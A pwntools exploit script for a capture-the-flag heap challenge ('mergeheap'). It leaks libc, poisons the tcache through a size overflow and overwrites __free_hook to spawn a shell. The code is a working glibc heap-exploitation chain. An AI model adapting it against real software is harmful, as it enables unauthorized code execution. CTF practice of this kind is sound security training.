# coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
elf = ELF ("./mergeheap")
sh = process("./mergeheap")
#sh = remote("node3.buuoj.cn",29930)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
def cmd(choice):
    sh.recvuntil(">>")
    sh.sendline(str(choice))

def add(size,content):
    sh.recvuntil(">>")
    sh.sendline('1')
    sh.recvuntil("len:")
    sh.sendline(str(size))
    sh.recvuntil("content:")
    sh.send(str(content))

def show(index):
    cmd(2)
    sh.recvuntil("idx:")
    sh.sendline(str(index))

def dele(index):
    cmd(3)
    sh.recvuntil("idx:")
    sh.sendline(str(index))

def merge(index1,index2):
    cmd(4)
    sh.recvuntil("idx1:")
    sh.sendline(str(index1))
    sh.recvuntil("idx2:")
    sh.sendline(str(index2))

for i in range (0,9): #0-8
    add(0x200,'aaaa\n')  

for i in range (0,8): #0-7
    dele(i)


add(8,'aaaaaaaa') #0
show(0)
leak = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc_base = leak -0x3ebea0
log.info("success get libc_base address:0x%x" %libc_base)
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + 0x4f322
system_addr = libc_base + libc.symbols['system']
dele(0)
dele(8)

add(0x30,"a" * 0x30) #0
add(0x38,"a" * 0x38) #1
add(0x100,"a\n") #2
add(0x68,"a\n") #3
add(0x20,"a\n") #4
add(0x20,"a\n") #5
add(0x20,"a\n") #6
add(0x20,"/bin/sh\x00\n") #7
dele(3)
dele(5)
dele(6)
merge(0,1) #3 chunk4->size = 0x111
dele(4)
add(0x100,"a"*0x60 + p64(free_hook) + "\n")
add(0x20,"a\n")
add(0x20,p64(one_gadget)+"\n")
dele(7)
sh.interactive()